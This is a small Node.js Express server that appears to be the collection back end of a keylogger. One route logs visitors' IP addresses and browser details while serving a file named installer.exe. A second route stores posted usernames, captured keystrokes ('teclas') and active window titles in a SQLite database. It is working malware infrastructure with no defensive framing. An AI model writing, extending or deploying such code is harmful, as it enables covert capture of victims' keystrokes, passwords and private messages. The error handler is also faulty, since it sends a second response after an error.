import express from "express";
import Database from "better-sqlite3";
import path from "node:path";

const PORT = process.argv[2];

const server = express();
server.use(express.json());

server.get("/download", (req, res) => {
  const target = {
    ip: req.ip,
    useragent: req.get("User-Agent"),
    referer: req.get("Referer"),
  };

  console.log(target);

  const caminho = path.join(process.cwd(), "public", "installer.exe");

  res.download(caminho);
});

server.post("/", (req, res) => {
  const db = new Database("seraphim.db");
  db.exec(`CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    payload_content TEXT NOT NULL,
    window TEXT NOT NULL,
    registred_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
  )`);

  const insertPayload = db.prepare(
    `INSERT INTO logs (username, payload_content, window) VALUES (?, ?, ?)`,
  );

  try {
    insertPayload.run(
      req.body.usuario,
      req.body.teclas.trimEnd(),
      req.body.janela,
    );
  } catch (error) {
    res.status(500).send();
  }

  db.close();
  res.status(200).send();
});

server.listen(PORT);
